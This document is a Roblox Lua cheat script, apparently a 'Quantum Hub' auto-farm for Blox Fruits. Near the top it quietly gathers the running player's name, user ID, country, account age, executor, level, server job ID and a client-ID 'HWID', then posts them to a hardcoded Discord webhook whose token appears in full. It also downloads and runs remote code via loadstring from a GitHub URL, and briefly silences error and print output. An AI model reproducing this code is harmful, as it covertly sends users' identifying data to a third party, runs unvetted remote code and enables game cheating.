local LocalizationService = game:GetService("LocalizationService")
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local pseudoHWID = nil
pcall(function()
    pseudoHWID = game:GetService("RbxAnalyticsService"):GetClientId() 
end)

local gameLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/"

local le = (game:GetService("Players").LocalPlayer.Data.Level.Value)
local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
local data = {
    embeds = {
        {
            title = " New Player",
            url = "https://www.roblox.com/users/" .. player.UserId,
            description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
            color = tonumber(0xffa500),
            author = {
                name = "",
                url = "",
                icon_url = ""
            },
            image = {
            	url = ""
            },
            footer = {
                text = " Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
                icon_url = ""
            },
            fields = {
                {
                    name = "·¥Ñ·¥è·¥ú…¥·¥õ Ä èüåê",
                    value = "```" .. code .. "```",
                    inline = true
                },
                {
                    name = "·¥Ä…¢·¥áüìÜ",
                    value = "```" .. player.AccountAge .. " Days```",
                    inline = true
                },
                {
                    name = "·¥áx·¥á·¥Ñ·¥ú·¥õ·¥è Äüí¨",
                    value = "```" .. identifyexecutor() .. "```",
                    inline = true
                },
                {
                    name = " ü·¥á·¥†·¥á üüÜô:",
                    value = "```" .. le .. "```",
                    inline = true
                },
                {
                    name = "·¥ä·¥è ô …™·¥Ö:",
                    value = "```".. tostring(game.JobId) .."```",
                    inline = true
                },
                {
                    name = "s·¥õ·¥Ä·¥õ·¥ús‚ùó",
                    value = "```Ng∆∞·ªùi D√πng ƒê√£ D√πng Script Auto Farm Blox Fruit C·∫£m ∆†n B·∫°n!!!```",
                    inline = true
                },
                {
                    name = "HWID",
                    value = "`" .. (pseudoHWID or "N/A") .. "`",  -- Show pseudo-HWID or "N/A" if unavailable
                    inline = true
                },
                {
                    name = "Direct Join",
                    value = gameLink, 
                    inline = true
                }
            }
        }
    }
}

local jsonData = HttpService:JSONEncode(data)
local webhookUrl = "https://discord.com/api/webhooks/1247783062515879947/yJ42T5wW0bTEWMh_Kkbkw-TSd7VrlQJVynZ_Wy4tvF1tQJdvHXMkiYBHHb9cDD9RYjII"
local headers = {["Content-Type"] = "application/json"}
request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
local request = http_request or request or HttpPost or syn.request
local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}

local success, response = pcall(request, final)
if success then
    print("Profile information sent to Discord.")
else
    print("Failed to send profile information to Discord: " .. response)
end



repeat task.wait()until game:IsLoaded()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 9e9)
local CommF = Remotes:WaitForChild("CommF_", 9e9)

local Quantum = loadstring(game:HttpGet("https://raw.githubusercontent.com/FlazhGG/Quantum-V2/main/QuantumHubLibrary"))()

local Window = Quantum:CreateWindow({
    Title = "Quantum Hub",
    SubTitle = "BloxFruit",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 430),
    Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Quantum",
    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
})

task.spawn(function()
    local originalWarn = warn
    local originalError = error
    local originalRconsolewarn = rconsolewarn
    local originalRconsoleerr = rconsoleerr
    local originalPrint = print

    -- Override functions to suppress output
    warn = function() end
    error = function() end
    rconsolewarn = function() end
    rconsoleerr = function() end
    print = function() end 

    -- Loop and destroy effects (error-safe)
    pcall(function()  -- Use pcall to handle potential errors
        for _, effect in pairs(game:GetService("ReplicatedStorage").Effect.Container:GetChildren()) do
            if effect.Name == "Death" or effect.Name == "Spawn" then
                effect:Destroy()
            end
        end
    end)

    -- Restore original functions (optional, for debugging)
    warn = originalWarn
    error = originalError
    rconsolewarn = originalRconsolewarn
    rconsoleerr = originalRconsoleerr
    print = originalPrint
end)

local Info = Window:AddTab({Title = "Info", Icon = "crown"})


local Time = Info:AddParagraph({Title = "", Content = ""})
local OSDate = Info:AddParagraph({Title = "", Content = ""})

local function UpdateOS()
    local date = os.date("*t")
    local hour = (date.hour) % 24
    local ampm = hour < 12 and "AM" or "PM"
    local timezone = string.format("%02i:%02i:%02i %s", ((hour -1) % 12) + 1, date.min, date.sec, ampm)
    local datetime = string.format("%02d/%02d/%04d", date.day, date.month, date.year)
    local LocalizationService = game:GetService("LocalizationService")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local name = player.Name
    local result, code = pcall(function()
     return LocalizationService:GetCountryRegionForPlayerAsync(player)
     end)
     OSDate:SetTitle(datetime.." - "..timezone.." [" .. code .. "]")
    end
    spawn(function()
     while true do
     UpdateOS()
     game:GetService("RunService").RenderStepped:Wait()
     end
     end)

     function UpdateTime()
        local GameTime = math.floor(workspace.DistributedGameTime+0.5)
        local Hour = math.floor(GameTime/(60^2))%24
        local Minute = math.floor(GameTime/(60^1))%60
        local Second = math.floor(GameTime/(60^0))%60
        Time:SetTitle("[Sever Time]: Hours: "..Hour.." Min: "..Minute.." Sec: "..Second)
        end
        
        spawn(function()
        while task.wait() do
        pcall(function()
        UpdateTime()
        end)
        end
        end)
